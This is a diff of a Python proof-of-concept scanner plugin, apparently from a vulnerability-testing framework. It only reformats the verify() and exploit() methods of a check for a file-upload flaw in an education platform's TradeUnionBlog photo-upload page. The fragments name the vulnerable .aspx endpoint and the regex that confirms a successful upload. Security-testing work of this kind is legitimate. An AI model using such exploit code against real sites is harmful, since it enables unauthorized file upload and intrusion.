@@ -104,9 +104,10 @@ class Poc(ABPoc):
                 }
             }
         }
-                    
+
     def verify(self):
-        self.target = self.target.rstrip('/') + '/' + (self.get_option('base_path').lstrip('/'))
+        self.target = self.target.rstrip(
+            '/') + '/' + (self.get_option('base_path').lstrip('/'))
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
@@ -129,7 +130,8 @@ class Poc(ABPoc):
             self.output.info('执行异常{}'.format(e))
 
     def exploit(self):
-        self.target = self.target.rstrip('/') + '/' + (self.get_option('base_path').lstrip('/'))
+        self.target = self.target.rstrip(
+            '/') + '/' + (self.get_option('base_path').lstrip('/'))
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
@@ -144,7 +146,7 @@ class Poc(ABPoc):
                 '(\xcc\xe1\xbd\xbb\xb3\xc9\xb9\xa6\xa3\xa1|\xe6\x8f\x90\xe4\xba\xa4\xe6\x88\x90\xe5\x8a\x9f\xef\xbc\x81)', res)
             if m:
                 print(('[upload success] ' + url +
-                      '/EduPlate/TradeUnionBlog/TradeUnionPhtoAdd.aspx'))
+                       '/EduPlate/TradeUnionBlog/TradeUnionPhtoAdd.aspx'))
 
             code, head, res, errcode, _ = hh.http(
                 url + '/EduPlate/TradeUnionBlog/TradeUnionPhtoAll.aspx')
